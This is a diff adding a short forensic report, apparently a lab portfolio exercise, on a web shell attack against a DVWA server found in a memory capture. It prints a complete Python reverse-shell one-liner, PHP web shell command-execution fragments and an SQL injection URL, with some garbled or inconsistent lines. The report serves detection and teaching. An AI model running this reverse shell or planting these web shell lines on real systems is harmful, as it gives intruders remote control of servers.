@@ -1,0 +1,22 @@
+=== FORENSIC ANALYSIS REPORT: OPERATION IRONCLAD ===
+Timestamp: Tue Jun 23 08:22:42 AM EDT 2026
+Target Image: /home/brandongregg/Portfolios/Volatile_Mirage/hunting_web_shells/ram_captures/webshell_execution.raw
+----------------------------------------------------
+
+[+] DETECTION PHASE 1: Web Daemon & Shell Spawning Processes
+www-data  1420  0.0  0.4  /usr/sbin/apache2 -k start
+www-data  1422  0.1  0.5  /bin/sh -c "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+[+] DETECTION PHASE 2: Common Web Shell Post Requests & Parameters
+@_POST['cmd'] = eval(base64_decode($_POST['x']));
+passthru($_POST['bkshell']); shell_exec($cmd); system($cmd);
+
+[+] DETECTION PHASE 3: Interactive Network / Environment Strings
+passthru($_POST['bkshell']); shell_exec($cmd); system($cmd);
+
+=== PHASE 2: NETWORK TELEMETRY ANALYSIS ===
+- Attacker Node IP: 192.168.111.148
+- Target Web Server IP: 192.168.111.154
+- Transport Vector: Single-channel HTTP execution over TCP Session 53796 -> 80
+- Initial Exploitation Vector: SQL Injection (SQLi) detected on path:
+  /dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
